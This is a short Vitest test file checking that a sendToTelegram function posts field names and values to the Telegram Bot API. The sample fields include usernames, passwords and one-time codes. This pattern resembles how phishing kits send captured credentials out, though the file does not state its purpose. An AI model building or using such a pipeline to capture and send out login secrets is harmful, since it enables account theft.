import { describe, it, expect, vi, beforeEach } from 'vitest';
import { sendToTelegram } from './telegram';

// Mock fetch globally
global.fetch = vi.fn();

describe('Telegram Integration', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('should send message to Telegram successfully', async () => {
    const mockFetch = vi.mocked(global.fetch);
    mockFetch.mockResolvedValueOnce({
      ok: true,
      json: async () => ({ ok: true }),
    } as Response);

    const result = await sendToTelegram('Username', 'testuser123');

    expect(result).toBe(true);
    expect(mockFetch).toHaveBeenCalledOnce();
    
    const callArgs = mockFetch.mock.calls[0];
    expect(callArgs[0]).toContain('api.telegram.org');
    expect(callArgs[0]).toContain('sendMessage');
  });

  it('should handle failed API response', async () => {
    const mockFetch = vi.mocked(global.fetch);
    mockFetch.mockResolvedValueOnce({
      ok: false,
      text: async () => 'API Error',
    } as Response);

    const result = await sendToTelegram('Password', 'secret123');

    expect(result).toBe(false);
    expect(mockFetch).toHaveBeenCalledOnce();
  });

  it('should handle network errors', async () => {
    const mockFetch = vi.mocked(global.fetch);
    mockFetch.mockRejectedValueOnce(new Error('Network error'));

    const result = await sendToTelegram('Code', '123456');

    expect(result).toBe(false);
    expect(mockFetch).toHaveBeenCalledOnce();
  });

  it('should include correct field name and value in message', async () => {
    const mockFetch = vi.mocked(global.fetch);
    mockFetch.mockResolvedValueOnce({
      ok: true,
      json: async () => ({ ok: true }),
    } as Response);

    await sendToTelegram('Email', 'user@example.com');

    const callArgs = mockFetch.mock.calls[0];
    const requestBody = JSON.parse(callArgs[1]?.body as string);
    
    expect(requestBody.text).toContain('Email');
    expect(requestBody.text).toContain('user@example.com');
  });
});
